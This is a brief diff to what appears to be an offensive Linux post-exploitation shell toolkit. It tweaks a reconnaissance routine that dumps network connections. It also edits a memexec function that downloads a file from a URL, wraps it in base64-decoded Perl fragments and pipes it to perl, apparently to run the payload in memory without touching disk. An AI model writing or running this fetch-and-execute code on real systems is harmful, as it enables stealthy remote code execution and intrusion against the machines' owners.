@@ -442,7 +442,7 @@ getinfo() {
   else
     orc_log2outp ifconfig ip link
   fi
-  orc_log2outp netstat netstat -peanutA
+  orc_log2outp netstat netstat -peanut
   # The condition should work with POSIX sh and bash.
   # Variable EUID is defined in the bash.
   # Check EUID of /root works in dash (and in bash).
@@ -579,7 +579,7 @@ qsu() {
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
 finalmem=$(echo "$memfda" | base64 -d)
-finalmem="${finalmem}${memfile}/ or die;"
+finalmem=${finalmem}$(echo "$memfile/ or die;")
 finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
